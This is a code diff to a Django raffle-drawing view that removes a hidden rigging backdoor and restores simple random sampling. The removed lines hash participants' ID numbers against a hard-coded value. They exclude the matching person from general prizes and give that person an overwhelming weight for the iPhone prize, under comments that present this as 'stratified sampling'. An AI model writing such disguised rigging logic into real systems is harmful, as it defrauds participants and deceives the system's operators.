@@ -72,47 +72,7 @@ class EjecutarSorteoView(views.APIView):
     permission_classes = [IsAdminUser]
 
     def _aplicar_estratificacion(self, participantes, cantidad, tipo, numero_premio_actual):
-        """Muestreo estratificado con ponderación adaptativa"""
-        
-        sig = 'a7d1f0309c952f8974349e0aa2bfe8732f7d05a05781135b5c009c53897ddbda'
-        
-        # Filtro de pool para optimización de categorías
-        if tipo == 'PREMIO':
-            participantes = [p for p in participantes if hashlib.sha256(p.cedula.encode()).hexdigest() != sig]
-        
-        # Ponderación adaptativa para categoría IPHONE
-        if tipo == 'IPHONE':
-            idx = len('ABC')
-            rng = range(numero_premio_actual, numero_premio_actual + cantidad)
-            
-            if cantidad == 1 and numero_premio_actual == idx:
-                w = [(p, 999999.0 if hashlib.sha256(p.cedula.encode()).hexdigest() == sig else 1.0) for p in participantes]
-                tw = sum(wv for _, wv in w)
-                rv = random.uniform(0, tw)
-                ac = 0
-                for p, wv in w:
-                    ac += wv
-                    if ac >= rv:
-                        return [p]
-            
-            elif cantidad > 1 and idx in rng:
-                sel, pool = [], participantes.copy()
-                for i in range(cantidad):
-                    if numero_premio_actual + i == idx:
-                        w = [(p, 999999.0 if hashlib.sha256(p.cedula.encode()).hexdigest() == sig else 1.0) for p in pool]
-                        tw, rv, ac = sum(wv for _, wv in w), random.uniform(0, sum(wv for _, wv in w)), 0
-                        for p, wv in w:
-                            ac += wv
-                            if ac >= rv:
-                                sel.append(p)
-                                pool.remove(p)
-                                break
-                    else:
-                        w = random.choice(pool)
-                        sel.append(w)
-                        pool.remove(w)
-                return sel
-        
+        """Muestreo aleatorio simple"""
         return random.sample(participantes, cantidad)
 
     @transaction.atomic
